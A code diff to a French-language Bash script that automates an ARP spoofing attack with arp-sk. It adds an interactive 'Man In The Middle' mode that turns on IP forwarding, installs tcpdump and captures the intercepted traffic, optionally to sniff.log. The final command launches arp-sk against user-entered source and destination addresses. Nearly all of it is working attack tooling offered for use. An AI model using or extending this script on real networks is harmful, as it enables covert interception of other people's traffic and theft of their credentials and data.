@@ -60,8 +60,7 @@ macChange=""
 
 until [[ "$macChange" = "oui" || "$macChange" = "o" || "$macChange" = "n" || "$macChange" = "non" ]]
 do
-	read -p "	    Voulez vous changez votre adresse mac ?? (oui ou non) : " macChange
-	echo -e "$macChange\n"
+	read -p "	    Voulez vous changez votre adresse mac ?? (oui/non) : " macChange
 done
 
 if [[ "$macChange" = "oui" || "$macChange" = "o" ]]
@@ -87,7 +86,7 @@ routeur=""
 
 until [[ "$routeur" = "oui" || "$routeur" = "o" || "$routeur" = "n" || "$routeur" = "non" ]]
 do
-	read -p "		Se configurer en routeur ?? (oui ou non) : " routeur
+	read -p "	          Se configurer en routeur ?? (oui/non) : " routeur
 done
 
 if [[ "$routeur" = "oui" || "$routeur" = "o" ]]
@@ -100,17 +99,15 @@ else echo 0 > /proc/sys/net/ipv4/ip_forward
 
 fi
 
-
 echo -e "================================================================================\n"
 
 echo -e "\n================================================================================"
 
-#read -p "			Installer le paquet arp-sk ? (oui ou non) : " installArp
 installArp=""
 
 until [[ "$installArp" = "oui" || "$installArp" = "o" || "$installArp" = "n" || "$installArp" = "non" ]]
 do
-	read -p "			Installer le paquet arp-sk ? (oui ou non) : " installArp
+	read -p "		  Installer le paquet arp-sk ? (oui/non) : " installArp
 done
 
 if [[ "$installArp" = "oui" || "$installArp" = "o" ]]
@@ -132,6 +129,29 @@ then
 	exit 1
 fi
 
+echo -e "================================================================================\n"
+
+echo -e "\n================================================================================"
+
+if [[ "$routeur" = "oui" || "$routeur" = "o" ]]
+then
+	MITM=""
+
+	until [[ "$MITM" = "oui" || "$MITM" = "o" || "$MITM" = "n" || "$MITM" = "non" ]]
+	do
+		read -p "          Voulez vous faire une attaque Man In The Middle ? (oui/non) : " MITM
+	done
+
+	if [[ "$MITM" = "oui" || "$MITM" = "o" ]]
+	then
+		if [ -z "$(dpkg -l | grep 'tcpdump')" ]
+		then
+			echo -e "\nInstallation de tcpdump"
+
+			apt-get install tcpdump
+		fi
+	fi
+fi
 
 echo -e "================================================================================\n"
 
@@ -145,8 +165,32 @@ echo ""
 
 read -p "	    	Adresse ip de destination : " adresseDestination
 
-echo -e "================================================================================\n\n"
+echo -e "================================================================================\n"
 
-echo -e "\t\t\t\t  Attaque :\n\n"
+if [[ "$routeur" = "oui" || "$routeur" = "o" ]]
+then
+	if [[ "$MITM" = "oui" || "$MITM" = "o" ]]
+	then
+	fichier=""
+
+	until [[ "$fichier" = "oui" || "$fichier" = "o" || "$fichier" = "n" || "$fichier" = "non" ]]
+	do
+		read -p "		    Ecrire dans un fichier le sniff ? (oui/non) : " fichier
+	done
+
+		if [[ "$fichier" = "oui" || "$fichier" = "o" ]]
+		then 
+			echo -e "\nLe résultat sera écrit dans sniff.log\n"
+
+			xterm -e tcpdump -w sniff.log &
+		else
+			echo -e "\n"
+
+			xterm -e tcpdump &
+		fi
+	fi
+fi
+
+echo -e "\n\n\t\t\t\t  Attaque :\n\n"
 
 arp-sk -s $ip -d $adresseDestination -S $adresseSource -D $adresseDestination -T u10000 -i $interface
